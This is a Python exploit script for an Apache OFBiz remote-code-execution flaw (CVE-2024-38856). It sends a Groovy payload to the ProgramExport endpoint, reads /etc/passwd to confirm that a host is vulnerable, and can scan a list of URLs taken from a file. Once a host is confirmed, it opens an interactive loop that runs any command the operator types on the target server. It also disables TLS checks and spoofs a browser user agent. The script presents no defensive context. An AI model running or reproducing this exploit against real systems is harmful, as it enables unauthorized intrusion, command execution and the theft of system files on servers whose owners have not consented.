import requests
import urllib3
from urllib.parse import urljoin,quote
import argparse
import ssl
import re
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url,"/webtools/control/main/ProgramExport")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "groovyProgram=throw new Exception('cat /etc/passwd'.execute().text);"
    try:
        response = requests.post(target, verify=False, headers=headers, timeout=15,data=data)
        if response.status_code == 200 and 'root:' in response.text and 'sbin' in response.text and 'Exception' in response.text:
            print(f"\033[31mDiscovered:{url}: ApacheOFBi_CVE-2024-38856_RCE!\033[0m")
            return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/webtools/control/main/ProgramExport")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    if check(url):
        while True:
            command = quote(input("\033[34mPlease input command (stop input:exit):\033[0m"))
            command = quote(command)
            if "exit" not in command:
                data = "groovyProgram=throw new Exception('{}'.execute().text);".format(command)
                try:
                    response_sult = requests.post(target, verify=False, headers=headers, timeout=15,data=data)
                    if response_sult.status_code == 200 and 'Exception' in response_sult.text and 'Errors' in response_sult.text and 'Occurred' in response_sult.text:
                        start = response_sult.text.find("java.lang.Exception:") + len("java.lang.Exception:")
                        end = response_sult.text.rfind("</p>")
                        extracted_content = response_sult.text[start:end]
                        print(extracted_content.strip())
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")